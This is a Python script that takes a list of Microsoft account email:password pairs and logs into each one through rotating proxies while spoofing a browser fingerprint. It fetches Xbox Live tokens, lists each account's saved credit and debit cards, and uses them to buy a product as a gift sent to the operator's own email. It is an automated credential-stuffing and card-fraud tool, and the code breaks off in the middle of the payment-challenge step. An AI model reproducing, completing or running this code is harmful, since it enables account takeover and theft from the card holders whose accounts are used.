from ast import Break
from operator import le
import requests
import random
import urllib.parse
import string
import re
import tls_client
import json
import time
import yaml
import os
import threading
from datetime import datetime
from requests_toolbelt import MultipartEncoder
from colorama import Fore, Style, init
from concurrent.futures import ThreadPoolExecutor
import tkinter as tk
import concurrent.futures
import time
import os
import threading
from concurrent.futures import ThreadPoolExecutor, wait
Lock = threading.Lock()
init()
os.system('cls')

flights = "sc_allowvenmoforbuynow-universalwebstore", "sc_appendconversiontype", "sc_imagelazyload", "sc_pidlerrorhandler-minecraftnet", "sc_showvalidpis", "sc_checkoutitemfontweight", "sc_challengescenarioda", "sc_itemsubpricetsenabled", "sc_purchasedblockedby", "sc_passthroughculture", "sc_checkoutplaceordermoraybuttons", "sc_cartcoadobetelemetryfix", "sc_redirecttosignin", "sc_disablelistpichanges-storewindowsinapp", "sc_errorscenariotelemetry", "sc_buynowpmgrouping", "sc_paymentpickeritem", "sc_cleanreducercode", "sc_dimealipaystylingfix", "sc_asyncpurchasefailure", "sc_promocode", "sc_buynowpmgrouping-clipchamp", "sc_manualreviewcongrats", "sc_optionalcatalogclienttype", "sc_klarna", "sc_preparecheckoutrefactor", "sc_euomnibusprice", "sc_gcoitemeligibility", "sc_productimageoptimization", "sc_reactredeemv2", "sc_currencyformattingpkg", "sc_fixasyncpiflow", "sc_pidlnetworkerror", "sc_allowvenmoforbuynow", "sc_redeemupdateprofileredirect", "sc_promocodefeature-web-desktop", "sc_disabledpaymentoption", "sc_enablecartcreationerrorparsing", "sc_purchaseblock", "sc_returnoospsatocart", "sc_updatepopupstring", "sc_allowpaysafeforus", "sc_fixasyncpitelemetry", "sc_apperrorboundarytsenabled", "sc_allowupiqr", "sc_apgpinlineerror", "sc_allowpaysafeforus-minecraftnet", "sc_usenewinstructionstring", "sc_reactredeem-xboxsocial", "sc_fincastlecallerapplicationidcheck", "sc_versionts", "sc_allowpaypalbnpl", "sc_officescds", "sc_allowpaypalbnplforcheckout", "sc_disableupgradetrycheckout", "sc_extendPageTagToOverride", "sc_mcupgrade", "sc_perfscenariofix", "sc_disablebuynowpmgrouping-officedime", "sc_skipselectpi", "sc_disablecsvforadd-minecraftnet", "sc_allowmpesapi", "sc_reloadiflineitemdiscrepancy", "sc_fatalerroractionsts", "sc_removereduxtoolkit", "sc_allowvenmo", "sc_spinnerts", "sc_buynowpmgrouping-storeapp", "sc_gifterroralert", "sc_newentitle", "sc_achpaymentoptiontsenabled", "sc_shippingallowlist", "sc_autorenewalconsentnarratorfix", "sc_emptyresultcheck", "sc_bulkupdateproducts", "sc_buynowpagetsenabled", "sc_buynowpmgrouping-xboxcom", "sc_buynowroutetsenabled", "sc_giftredeemlegalterms", "sc_abandonedretry", "sc_analyticsforbuynow", "sc_removelodash", "sc_isrighttoleftinpage", "sc_asyncpurchasefailurexboxcom", "sc_apploadingts", "sc_prominenteddchange", "sc_buynowpmgrouping-minecraftnet", "sc_disableshippingaddressinit", "sc_preparecheckoutperf", "sc_promocodecheckout", "sc_buynowuiprod", "sc_contentratingts", "sc_allowvenmoforbuynow-xboxcom", "sc_rspv2", "sc_buynowlistpichanges", "sc_disableupiforbuynow-officedime", "sc_allowpaysafeforus-storeapp", "sc_checkoutorderreceiptemailv2", "sc_expiredcardnextbutton", "sc_uuid", "sc_checkoutasyncpurchase", "sc_readytopurchasefix", "sc_enablelegalrequirements", "sc_pidlignoreesckey", "sc_expanded.purchasespinner", "sc_trycheckoutnobackup", "sc_disablevenmoforbuynow-officedime", "sc_hideredeemclient-minecraftnet", "sc_buynowpmgrouping-universalwebstore", "sc_giftingtelemetryfix", "sc_alwayscartmuid", "sc_checkoutloadspinner", "sc_reactredeem-storewindowsinapp", "sc_perfloadeventfix", "sc_usekoreanlegaltermstring", "sc_purchaseredirectcontinuets", "sc_fincastleui", "sc_updateprofiletsenabled", "sc_flexsubs", "sc_notfoundts", "sc_useonedscookiemanager", "sc_studentmilitarydiscountonrail", "sc_scenariotelemetryrefactor", "sc_promocodefocus", "sc_onbodytsenabled", "sc_pidlerrorhandler-storeapp", "sc_bankchallengecheckout", "sc_allowupiqrforbuynow", "sc_fixforonlyasyncpiselect", "sc_railv2", "sc_checkoutglobalpiadd", "sc_reactcheckout", "sc_minmaxcheck", "sc_checkoutplaceorderhinttextv2", "sc_helpv2", "sc_xboxcomnosapi", "sc_updateredemptionlink", "sc_reactredeem-universalwebstore", "sc_clientdebuginfo", "sc_productlegaltermsv1ts", "sc_pidlerrorhandler-xeweb", "sc_reactredeem-storeapp", "sc_hidedisabledpis", "sc_paymentoptionnotfound", "sc_removeresellerforstoreapp", "sc_hideshippingfee", "sc_enablekakaopay", "sc_checkoutcontactpreference", "sc_ordercheckoutfix", "sc_calldccforasyncpi", "sc_promostepstatus", "sc_copycurrentcart", "sc_buynowglobalpiadd", "sc_overlayfix", "sc_buynowpmgrouping-skypecom", "sc_buynowuipreload", "sc_bnplmsgcart", "sc_updatebillinginfo", "sc_buynowpmgrouping-cascadewebstore", "sc_allowpaysafeforus-xboxcom", "sc_buynowpmgrouping-surfaceapp", "sc_readymessagemark", "sc_allowupiforbuynow", "sc_redeemerroralert", "sc_suppressanchorcontextmenu", "sc_xboxcomasyncpurchase", "sc_disablebuynowpmgrouping-storewindowsinapp", "sc_reactredeem-xboxcom", "sc_askaparentroutetsenabled", "sc_errorcartinfotelemetry", "sc_skypenonactiveerror", "sc_skippurchaseconfirm", "sc_cartcoriskchallengemorayfix", "sc_buynowfocustrapkeydown", "sc_shareddowngrade", "sc_addasyncpitelemetry", "sc_eligibilityapi", "sc_paymentchallengetsenabled", "sc_allowvenmoforbuynow-minecraftnet", "sc_removesetpaymentmethod", "sc_ordereditforincompletedata", "sc_disablecsvforadd-xenative", "sc_bankchallenge", "sc_billingaddressbuttontsenabled", "sc_enablecsvforredeem-xboxcom", "sc_allowelo", "sc_asyncpiurlupdate", "sc_upistringchanges", "sc_delayretry", "sc_pidlerrorhandler-xboxcom", "sc_allowupi", "sc_hidesubscriptionprice", "sc_perfredeemcomplete", "sc_loadtestheadersenabled", "sc_conversionblockederror", "sc_cleanuppromocodes", "sc_mcrenewaldatev2", "sc_allowpaysafecard", "sc_telemetryforbillingemail", "sc_pidlloading", "sc_addfocuslocktosubscriptionmodal", "sc_purchasedblocked", "sc_outofstock", "sc_buynowpagexboxts", "sc_allowcustompifiltering", "sc_purchaseblockerrorhandling", "sc_perfsummary", "sc_buynowcontactpref", "sc_errorpageviewfix", "sc_newcheckoutselectorforxboxcom", "sc_splipidltresourcehelper", "sc_xboxredirection", "sc_setbehaviordefaultvalue", "sc_clienttelemetryforceenabled", "sc_allowpaysafeforus-universalwebstore", "sc_updateratingdescription", "sc_paymentoptionlistts", "sc_formatjsxts", "sc_lowbardiscountmap", "sc_moraystyle", "sc_contactpreferenceupdate", "sc_paymentsessiontsenabled", "sc_hipercard", "sc_uppercasepromocode", "sc_reactredeem-xeweb", "sc_resellerdetail", "sc_askaparentinsufficientbalance", "sc_fincastlecalculation", "sc_moderngamertaggifting", "sc_allowvenmoforcheckout", "sc_xdlshipbuffer", "sc_allowverve", "sc_inlinetempfix", "sc_purchaseredirectwaitts", "sc_upgrademodaltrycheckout", "sc_devicerepairpifilter", "sc_statusts", "sc_greenshipping", "sc_reactredeem-surfaceapp", "sc_wrapshippingmethod", "sc_blocklegacyupgrade", "sc_xboxgamepad", "sc_xboxspinner", "sc_xboxclosebutton", "sc_xboxuiexp", "sc_disabledefaultstyles", "sc_gamertaggifting"
lock = Lock
config = yaml.safe_load(open('config.yml','r'))['data']
combo = []
lines = open("accs.txt", "r").read().splitlines()
for line in lines:
    combo.append(line)
class Counter:
    Invalid = 0
    Valid = 0
    Purchased = 0
    Failed = 0
    Error = 0
    MCFetched = 0
    etc_fetched = 0
    gamepasses = 0
    total = len(combo)
    used = 0
    remaining = total - used
    elapsed_time = 0
    RiskRejected = 0
    ProcesserTransaction = 0
    InsufficientFunds = 0
    RiskOther = 0
    Others = 0
    NoCards = 0
    Cards = 0
    MCfetchedpur = 0
    
class Logger:
    @staticmethod
    def Sprint(tag: str, content: str, color):
        ts = f"{Fore.RESET}{Fore.LIGHTBLACK_EX}{datetime.now().strftime('%H:%M:%S')}{Fore.RESET}"
        with lock:
            print(Style.BRIGHT + ts + color + f" [{tag}] " + Fore.RESET + content + Fore.RESET)
    
    @staticmethod
    def Ask(tag: str, content: str, color):
        ts = f"{Fore.RESET}{Fore.LIGHTBLACK_EX}{datetime.now().strftime('%H:%M:%S')}{Fore.RESET}"
        return input(Style.BRIGHT + ts + color + f" [{tag}] " + Fore.RESET + content + Fore.RESET)


class Purchase:
    def __init__(self,ms_creds:str) -> None:
        self.ms_creds = ms_creds
        self.email = ms_creds.split(':')[0]
        self.password = ms_creds.split(':')[1]
        self.auth_session = requests.Session()
        self.purchase_session = tls_client.Session(client_identifier="chrome112",random_tls_extension_order=True)
        self.purchase_session.headers['Accept-Encoding'] = "deflate"
        self.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
        self.productId = config['product_data']['productId']
        self.skuId =config['product_data']['skuId']
        self.receiveMail = config['product_data']['receiveMail']
        self.authproxytype = config['proxies']['Ysession']['auth_type']
        self.purchaseproxytype = config['proxies']['Ysession']['purchase_type']
        self.ysessionauth = config['proxies']['Ysession']['login']
        self.ysessionpurc = config['proxies']['Ysession']['purchase']
        self.use_proxy : str = config['proxies']['use_proxies']
        self.purchase_session.proxies = None
        self.auth_session.proxies = None
        self.proxysel()

    def proxysel(self):
        if self.use_proxy.lower() == "yes":
            if self.ysessionauth == "0":
                if self.authproxytype == "static":
                    self.auth_proxy = random.choice(open("static_proxies.txt", "r").read().splitlines()).strip()
                    if '@' in self.auth_proxy:
                        pass
                    else:
                        proxy_ip, proxy_port, username, password = self.auth_proxy.split(':')
                        self.auth_proxy = f"{username}:{password}@{proxy_ip}:{proxy_port}"
                    self.auth_session.proxies = {
                        "http": f"http://{self.auth_proxy}",
                        "https": f"http://{self.auth_proxy}"
                    }
                elif self.authproxytype == "residental":
                    self.auth_proxy = random.choice(open("residental_proxies.txt", "r").read().splitlines()).strip()
                    self.auth_session.proxies = {
                        "http": f"http://{self.auth_proxy}",
                        "https": f"http://{self.auth_proxy}"
                    }
            else:
                self.auth_proxy = None
                self.auth_session.proxies = {
                    "http": self.auth_proxy,
                    "https": self.auth_proxy
                }

            if self.ysessionpurc == "0":
                if self.purchaseproxytype == "static":
                    self.purchase_proxy = random.choice(open("static_proxies.txt", "r").read().splitlines()).strip()
                    if '@' in self.purchase_proxy:
                        pass
                    else:
                        proxy_ip, proxy_port, username, password = self.purchase_proxy.split(':')
                        self.purchase_proxy = f"{username}:{password}@{proxy_ip}:{proxy_port}"
                    self.purchase_session.proxies = {
                        "http": f"http://{self.purchase_proxy}",
                        "https": f"http://{self.purchase_proxy}"
                    }
                elif self.purchaseproxytype == "residental":
                    self.purchase_proxy = random.choice(open("residental_proxies.txt", "r").read().splitlines()).strip()
                    self.purchase_session.proxies = {
                        "http": f"http://{self.purchase_proxy}",
                        "https": f"http://{self.purchase_proxy}"
                    }
            else:
                self.purchase_proxy = None
                self.purchase_session.proxies = {
                    "http": self.purchase_proxy,
                    "https": self.purchase_proxy
                }

        else:
            self.auth_proxy = None
            self.purchase_proxy = None
            self.purchase_session.proxies = {
                "http": self.purchase_proxy,
                "https": self.purchase_proxy
            }
            self.auth_session.proxies = {
                "http": self.auth_proxy,
                "https": self.auth_proxy
            }

    @staticmethod
    def generateHexStr(len: int):
        return ''.join(random.choices('0123456789abcdef', k=len))
    @staticmethod
    def remove_content(filename: str, delete_line: str) -> None:
        with open(filename, "r+") as io:
            content = io.readlines()
            io.seek(0)
            for line in content:
                if not (delete_line in line):
                    io.write(line)
            io.truncate()

    def auth_get_request(self,*args,**kwargs):
        while True:
            try:
                return self.auth_session.get(*args,**kwargs)
            except:
                Counter.Error +=1
                self.proxysel()
                continue

    def auth_post_request(self,*args,**kwargs):
        while True:
            try:
                return self.auth_session.post(*args,**kwargs)
            except:
                Counter.Error +=1
                self.proxysel()
                continue
    
    def purchase_get_request(self,*args,**kwargs):
        while True:
            try:
                return self.purchase_session.get(*args,**kwargs)
            except:
                Counter.Error +=1
                self.proxysel()
                continue

    def purchase_post_request(self,*args,**kwargs):
        while True:
            try:
                return self.purchase_session.post(*args,**kwargs)
            except:
                Counter.Error +=1
                self.proxysel()
                continue

    def purchase_put_request(self,*args,**kwargs):
        while True:
            try:
                return self.purchase_session.put(*args,**kwargs)
            except:
                Counter.Error +=1
                self.proxysel()
                continue

    def doPrivacyNotice(self):
        privNotifUrl = self.loginResp.text.split('name="fmHF" id="fmHF" action="')[1].split('"')[0]
        corelationId = self.loginResp.text.split('name="correlation_id" id="correlation_id" value="')[1].split('"')[0]
        mCode = self.loginResp.text.split('type="hidden" name="code" id="code" value="')[1].split('"')[0]

        priveNotifPage = self.auth_post_request(privNotifUrl,data={'correlation_id':corelationId,'code':mCode}).text

        privNotifPostData={'AppName': 'ALC',
'ClientId': priveNotifPage.split("ucis.ClientId = '")[1].split("'")[0],
'ConsentSurface': 'SISU',
'ConsentType': 'ucsisunotice',
'correlation_id': corelationId,
'CountryRegion': priveNotifPage.split("ucis.CountryRegion = '")[1].split("'")[0],
'DeviceId':'' ,
'EncryptedRequestPayload': priveNotifPage.split("ucis.EncryptedRequestPayload = '")[1].split("'")[0],
'FormFactor': 'Desktop',
'InitVector':priveNotifPage.split("ucis.InitVector = '")[1].split("'")[0],
'Market': priveNotifPage.split("ucis.Market = '")[1].split("'")[0],
'ModelType': 'ucsisunotice',
'ModelVersion': '1.11',
'NoticeId': priveNotifPage.split("ucis.NoticeId = '")[1].split("'")[0],
'Platform': 'Web',
'UserId': priveNotifPage.split("ucis.UserId = '")[1].split("'")[0],
'UserVersion': '1'}
        privNotifPostData_m = MultipartEncoder(fields=privNotifPostData,boundary='----WebKitFormBoundary'+''.join(random.sample(string.ascii_letters + string.digits, 16)))

        self.auth_post_request('https://privacynotice.account.microsoft.com/recordnotice', headers={
    'authority': 'privacynotice.account.microsoft.com',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'en-US,en;q=0.7',
    'content-type': privNotifPostData_m.content_type,
    'origin': 'https://privacynotice.account.microsoft.com',
    'referer': privNotifUrl,
    'sec-gpc': '1',
    'user-agent': self.user_agent,
}, data=privNotifPostData_m)
    
        self.auth_session.headers['Referer'] = "https://privacynotice.account.microsoft.com/"
        returnUrl = urllib.parse.unquote(privNotifUrl.split('notice?ru=')[1])
        self.loginResp = self.auth_get_request(returnUrl)
    
    def fetchAuth(self):
        self.auth_session.headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.9',
    'Connection': 'keep-alive',
    'Sec-Fetch-Dest': 'document',
    'Accept-Encoding': 'identity',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'none',
    'Sec-Fetch-User': '?1',
    'Sec-GPC': '1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': self.user_agent,
}
        
        getLoginPage = self.auth_session.get('https://login.live.com/ppsecure/post.srf').text

        if not ",urlPost:'" in getLoginPage:
            Logger.Sprint('ERROR','Failed To Get Login Page Data!',Fore.LIGHTRED_EX)
            return "fail"

        self.flowToken1 = getLoginPage.split(''''<input type="hidden" name="PPFT" id="i0327" value="''')[1].split('"')[0]
        self.loginPostUrl = getLoginPage.split(",urlPost:'")[1].split("'")[0]
        self.credentialsUrl = getLoginPage.split("Cd:'")[1].split("'")[0]
        self.uaid = self.auth_session.cookies.get_dict()['uaid']

        loginPostData = f'i13=0&login={self.email}&loginfmt={self.email}&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={self.password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={self.flowToken1}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&isSignupPost=0&isRecoveryAttemptPost=0&i19=449894'
        self.auth_session.headers['Origin'] = "https://login.live.com"
        self.auth_session.headers['Referer'] = "https://login.live.com/"
        loginHeaders ={
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.9',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'https://login.live.com',
    'Referer': 'https://login.live.com/',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Sec-GPC': '1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': self.user_agent,
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Brave";v="120"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

        self.loginResp = self.auth_session.post(self.loginPostUrl,data=loginPostData,headers=loginHeaders)
        if "https://account.live.com/recover" in self.loginResp.text:
            Logger.Sprint('ERROR','2fa On Microsoft Account!',Fore.LIGHTRED_EX)
            Counter.Invalid +=1
            Counter.used +=1
            return "fail"
        if "https://privacynotice.account.microsoft.com/notice" in self.loginResp.text:
            self.doPrivacyNotice()
        if not "sFT:" in self.loginResp.text:
            Counter.used +=1
            Counter.Invalid +=1
            Logger.Sprint('ERROR',f'Invalid Microsoft Account!: {self.ms_creds}',Fore.LIGHTRED_EX)
            return "fail"
        Counter.used +=1
        self.flowToken2 = re.findall("sFT:'(.+?(?=\'))", self.loginResp.text)[0]
        self.loginPostUrl2 =  re.findall("urlPost:'(.+?(?=\'))", self.loginResp.text)[0]

        loginPostData2 = {
    "LoginOptions": "3",
    "type": "28",
    "ctx": "",
    "hpgrequestid": "",
    "PPFT": self.flowToken2,
    "i19": str(random.randint(10000,30000))
}
        self.auth_session.headers['Referer'] = self.loginPostUrl
        self.auth_session.headers['Origin'] = "https://login.live.com"
        midAuth2 = self.auth_post_request(self.loginPostUrl2,data=loginPostData2).text

    #     while "fmHF" in midAuth2:
    #         midAuth2 = {
    # "fmHF": midAuth2.split('name="fmHF" id="fmHF" action="')[1].split('"')[0],
    # "pprid": midAuth2.split('type="hidden" name="pprid" id="pprid" value="')[1].split('"')[0],
    # "nap": midAuth2.split('type="hidden" name="NAP" id="NAP" value="')[1].split('"')[0],
    # "anon": midAuth2.split('type="hidden" name="ANON" id="ANON" value="')[1].split('"')[0],
    # "t": midAuth2.split('<input type="hidden" name="t" id="t" value="')[1].split('"')[0]} 
    #         data = {
    #     'pprid': midAuth2["fmHF"],
    #     'NAP': midAuth2['nap'],
    #     'ANON': midAuth2['anon'],
    #     't': midAuth2['t'],
    # }
    #         midAuth2Url = midAuth2['fmHF']
    #         self.auth_session.headers['Referer'] = "https://login.live.com/"
    #         midAuth2 = self.auth_post_request(midAuth2Url,data=data).text   

        accountXbox = self.auth_get_request('https://account.xbox.com/',headers={
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.9',
    'Connection': 'keep-alive',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'none',
    'Sec-Fetch-User': '?1',
    'Sec-GPC': '1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': self.user_agent,
}).text
        if "fmHF" in accountXbox:
            xbox_json = {
"fmHF": accountXbox.split('id="fmHF" action="')[1].split('"')[0],
"pprid": accountXbox.split('id="pprid" value="')[1].split('"')[0],
"nap": accountXbox.split('id="NAP" value="')[1].split('"')[0],
"anon": accountXbox.split('id="ANON" value="')[1].split('"')[0],
"t": accountXbox.split('id="t" value="')[1].split('"')[0]}
            
            verifyToken = self.auth_post_request(xbox_json['fmHF'],timeout=20, headers={
        'Content-Type': 'application/x-www-form-urlencoded',
    },data={
        "pprid": xbox_json['pprid'],
        "NAP": xbox_json['nap'],
        "ANON": xbox_json['anon'],
        "t": xbox_json['t']
    }).text.split('name="__RequestVerificationToken" type="hidden" value="')[1].split('"')[0]
            self.auth_post_request("https://account.xbox.com/en-us/xbox/account/api/v1/accountscreation/CreateXboxLiveAccount", headers={
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'Accept-Language': 'en-US,en;q=0.9',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Origin': 'https://account.xbox.com',
    'Referer': xbox_json['fmHF'],
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-GPC': '1',
    'User-Agent': self.user_agent,
    'X-Requested-With': 'XMLHttpRequest',
    '__RequestVerificationToken': verifyToken,
},data={
        "partnerOptInChoice": "false",
        "msftOptInChoice": "false",
        "isChild": "true",
        "returnUrl": "https://www.xbox.com/en-US/?lc=1033"
    })
        getXbl = self.auth_get_request(f'https://account.xbox.com/en-us/auth/getTokensSilently?rp=http://xboxlive.com,http://mp.microsoft.com/,http://gssv.xboxlive.com/,rp://gswp.xboxlive.com/,http://sisu.xboxlive.com/').text
        try:
            rel = getXbl.split('"http://mp.microsoft.com/":{')[1].split('},')[0]
            json_obj = json.loads("{"+rel+"}")
            xbl_auth = "XBL3.0 x=" + json_obj['userHash'] + ";" + json_obj['token']
            return xbl_auth
        except:
            Logger.Sprint('-.',"Failed to get XBL Authorization!",Fore.LIGHTRED_EX)
            return "fail"
    def getCartsHeader(self):
        return {
    'authority': 'cart.production.store-web.dynamics.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'authorization': self.xbl3,
    'content-type': 'application/json',
    'ms-cv':f"{self.generateHexStr(22)}.0.4",
    'origin': 'https://www.microsoft.com',
    'referer': 'https://www.microsoft.com/',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': self.user_agent,
    'x-authorization-muid': self.muid,
    'x-ms-correlation-id': self.corId,
    'x-ms-tracking-id': self.trackId,
    'x-ms-vector-id':self.vectorId,
}
    def pm_mp_headers(self):
        return {
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.9',
    'Connection': 'keep-alive',
    'Origin': 'https://www.microsoft.com',
    'Referer': 'https://www.microsoft.com/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-site',
    'User-Agent': self.user_agent,
    'authorization': self.xbl3,
    'content-type': 'application/json',
    'correlation-context': f'v=1,ms.b.tel.scenario=commerce.payments.PaymentSessioncreatePaymentSession.1,ms.b.tel.partner=XboxCom,ms.c.cfs.payments.partnerSessionId=ndstkS61HgKfmXpx8X9IP2',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'x-ms-flight': 'EnableThreeDSOne',
    'x-ms-pidlsdk-version': '1.22.0_reactview',
}
        
    def getAvailibilityId(self):
        return self.purchase_get_request(f"https://displaycatalog.mp.microsoft.com/v7/products/{self.productId}?languages=Nuetral&market={self.market}").json()['Product']['DisplaySkuAvailabilities'][0]['Availabilities'][0]['AvailabilityId']

    def getPaymentMethods(self):
        getPMMethods = requests.get('https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US&partner=webblends',headers={"authorization":self.xbl3}).json()

        instruments = []
        for pm in getPMMethods:
            if pm["paymentMethod"]["paymentMethodFamily"]=="credit_card" and pm['status']=="Active":
                instruments.append({
                "id":pm['id'],
                "market" : pm['details']['address']['country'],
                "type" : pm["paymentMethod"]["paymentMethodType"]
            })
            elif pm["paymentMethod"]["paymentMethodFamily"]=="debit_card" and pm['status']=="Active":
                instruments.append({
                "id":pm['id'],
                "market" : pm['details']['address']['country'],
                "type" : pm["paymentMethod"]["paymentMethodType"]
            })
        return [i for n, i in enumerate(instruments) if i not in instruments[:n]]
            
    def purchase(self,pi_id:str,market:str,ctype:str): 
        risk = 0
        while True:
            self.proxysel()
            self.market = market.lower()
            self.locale = f"en-{market}"
            self.ctype = ctype
            self.paymentInstrumentId = pi_id
            AvailibilityId = self.getAvailibilityId()
            self.headers = {
        'authority': 'www.microsoft.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.xbox.com',
        'referer': 'https://www.xbox.com/',
        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Brave";v="120"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'iframe',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'cross-site',
        'sec-gpc': '1',
        'upgrade-insecure-requests': '1',
        'user-agent': self.user_agent,
    }
            buyNowData = {
        'data': json.dumps({"products":[{"productId":self.productId,"skuId":self.skuId,"availabilityId":AvailibilityId,"market":self.market,"locale":self.locale,"mscv":f"{Purchase.generateHexStr(20)}8.0","giftProduct":"true"}],"flights":["sc_minecraftctasupdate"],"clientType":"XboxCom","data":{"usePurchaseSdk":True},"layout":"Inline","cssOverride":"XboxCom","scenario":"gift"}),
        'auth': json.dumps({"XToken":self.xbl3}),
    }
            buyNow = self.purchase_post_request(f'https://www.microsoft.com/store/buynow?&noCanonical=true&market={self.market}&locale={self.locale}',data=buyNowData,headers=self.headers)
            if not buyNow.status_code < 400:
                Logger.Sprint('ERROR','Failed To Start Minecraft Order!',Fore.LIGHTRED_EX)
                return "fail"
            time.sleep(2.5)
            self.currencyCode = buyNow.text.split('"currencyCode":"')[1].split('"')[0]
            self.paymentInstrumentId = buyNow.text.split('{"paymentInstrumentId":"')[1].split('"')[0]
            self.cartId = buyNow.text.split('"cartId":"')[1].split('"')[0]
            self.muid = buyNow.text.split('"alternativeMuid":"')[1].split('"')[0]
            self.vectorId = buyNow.text.split('"vectorId":"')[1].split('"')[0]
            self.corId = buyNow.text.split('"correlationId":"')[1].split('"')[0]
            self.trackId = buyNow.text.split('"trackingId":"')[1].split('"')[0]
            self.accId = buyNow.text.split(',"accountId":"')[1].split('"')[0]
            self.soldToAddressId = buyNow.text.split(',"soldToAddressId":"')[1].split('"')[0]
            self.sessionId = buyNow.text.split('"sessionId":"')[1].split('"')[0]
            updateCartData = {
        'locale': self.locale,
        'market': self.market,
        'catalogClientType': '',
        'clientContext': {
            'client': 'XboxCom',
            'deviceFamily': 'Web',
        },
        'flights': flights,
        'paymentInstrumentId': self.paymentInstrumentId,
        'csvTopOffPaymentInstrumentId': None,
        'billingAddressId': {
            'accountId': self.accId,
            'id': self.soldToAddressId,
        },
        'sessionId': self.sessionId,
        'orderState': 'CheckingOut',
    }
            updateCart = self.purchase_put_request(f"https://cart.production.store-web.dynamics.com/cart/v1.0/cart/updateCart?cartId={self.cartId}&appId=BuyNow",json=updateCartData,headers=self.getCartsHeader())
            time.sleep(1.5)
            self.lineItemId = updateCart.json()["cart"]['lineItems'][0]['id']
            self.amount = updateCart.json()["cart"]['lineItems'][0]['totalAmount']
            #XboxCom
            #MinecraftNet
            updatelineItmesData = {
                
        'clientContext': {
            'client': 'XboxCom',
            'deviceFamily': 'Web',
        },
        'flights':flights,
        'items': [
            {
                'id': self.lineItemId,
                'giftee': {
                    'gifteeEmail': self.receiveMail,
                    'gifteeSenderName': 'Bhavya Jain',
                    'gifteeType': 'email',
                    'gifteeGamertag': '',
                },
            },
        ],
        'market': self.market,
        'locale':self.locale,
        'catalogClientType': '',
        'isGift': True,
    }
            fd = self.purchase_put_request(f"https://cart.production.store-web.dynamics.com/cart/v1.0/cart/bulkUpdateLineItems?cartId={self.cartId}&appId=BuyNow&tryCheckout=true&price=true",json=updatelineItmesData,headers=self.getCartsHeader())
            time.sleep(2.1)
            try:
                fd.json()['cart']['id']
            except:
                return
            descriptionsParams = {
        'paymentSessionData': json.dumps({'amount': self.amount,
    'challengeScenario': 'PaymentTransaction',
    'challengeWindowSize': '03',
    'country': self.market,
    'currency': self.currencyCode,
    'hasPreOrder': 'false',
    'language': self.locale,
    'partner': 'webblends',
    'piCid': self.accId,
    'piid': self.paymentInstrumentId,
    'purchaseOrderId': self.cartId}),
        'operation': 'Add',
    }
            descrptions = self.purchase_get_request(f"https://paymentinstruments.mp.microsoft.com/v6.0/users/me/PaymentSessionDescriptions",params=descriptionsParams,headers=self.pm_mp_headers())
            time.sleep(1.3)
            if not descrptions.status_code < 400:
                Logger.Sprint('ERROR',f'Failed 3DS: {self.ms_creds}',Fore.LIGHTYELLOW_EX)
                return "fail"

            self.threedsId = descrptions.json()[0]["clientAction"]["context"]["id"]
            #PSD2Challenge
            #ValidatePIOnAttachChallenge
            challengeDesceptionsParams = {
        'timezoneOffset': '-330',
        'paymentSessionOrData': json.dumps(
            {'amount': self.amount,
    'challengeScenario': 'PaymentTransaction',
    'challengeStatus': 'Unknown',
    'challengeType': 'PSD2Challenge',
    'challengeWindowSize': '03',
    'country':self.market, 
    'currency': self.currencyCode,
    'cv': 'N7nqsQzlrn5M4sop6e3BW8.0.4',
    'hasPreOrder': False,
    'id': self.threedsId,
    'isChallengeRequired': True,
    'isLegacy': False,
    'isMOTO': False,
